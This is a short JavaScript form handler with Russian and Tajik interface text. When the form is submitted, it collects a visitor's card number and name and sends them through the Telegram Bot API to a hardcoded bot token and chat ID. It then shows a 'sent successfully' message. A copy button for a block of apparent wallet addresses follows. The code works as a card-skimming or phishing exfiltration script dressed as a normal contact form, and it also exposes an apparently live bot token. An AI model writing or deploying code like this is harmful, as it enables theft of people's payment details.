const FORM_DATA = document.querySelector(".form-data");
const ERROR_MESSAGE = "Это ошибка!";
const SUCCESS_MESSAGE = "Отправлено успешно!";

FORM_DATA.addEventListener("submit", formSend);

async function formSend(event) {
  event.preventDefault();

  const TOKEN = "7234791306:AAGHoPdwJCWFOr22NyH2Q94Tzvha5dvJhV0"; // TODO use token telegram bot
  const CHAT_ID = "-1001615573279"; // TODO use chat_Id to telegram
  const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  let message = `
    <b>Информация:</b>
    <b>Номер карта:</b><i> ${this.email.value}</i>
    <b>Имя</b> : <i>${this.userMessage.value}</i>
    
    `;

  const response = await fetch(URI_API, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "html",
    }),
  });

  const result = await response.json();

  if (result.ok) {
    showMessage(true);
    FORM_DATA.reset();
  } else {
    showMessage(false);
    console.log(result);
  }
}

function showMessage(isSuccess) {
  let alert = document.querySelector(".alert");
  let text = document.querySelector(".alert p");
  let closeBtn = document.querySelector(".alert span");
  alert.classList.remove("hidden");

  if (isSuccess) {
    alert.classList.add("alert-success");
    text.textContent = SUCCESS_MESSAGE;
  } else {
    alert.classList.add("alert-danger");
    text.textContent = ERROR_MESSAGE;
  }

  closeBtn.addEventListener("click", (e) => {
    alert.classList.add("hidden");
  });
}

/* адреси кашелокро попя кунед */

// Get the <pre> element
const preTag = document.getElementById("myPreTag");

// Create a copy button element
const copyButton = document.createElement("span");
copyButton.innerText = "Копию";
copyButton.classList.add("copy-button");

// Append the copy button to the <pre> tag
preTag.appendChild(copyButton);

// Add click event listener to the copy button
copyButton.addEventListener("click", () => {
  // Hide the copy button temporarily
  copyButton.style.display = "none";

  // Create a range and select the text inside the <pre> tag
  const range = document.createRange();
  range.selectNode(preTag);
  window.getSelection().removeAllRanges();
  window.getSelection().addRange(range);

  try {
    // Copy the selected text to the clipboard
    document.execCommand("copy");

    // Alert the user that the text has been copied
    copyButton.innerText = "Отличный";
    setTimeout(function(){
      copyButton.innerText = "Готовый";
    }, 2000);
  } catch (err) {
    console.error("Unable to copy text:", err);
  } finally {
    // Show the copy button again
    copyButton.style.display = "inline";

    // Deselect the text
    window.getSelection().removeAllRanges();
  }
});

/* дигар кашлокҳо */




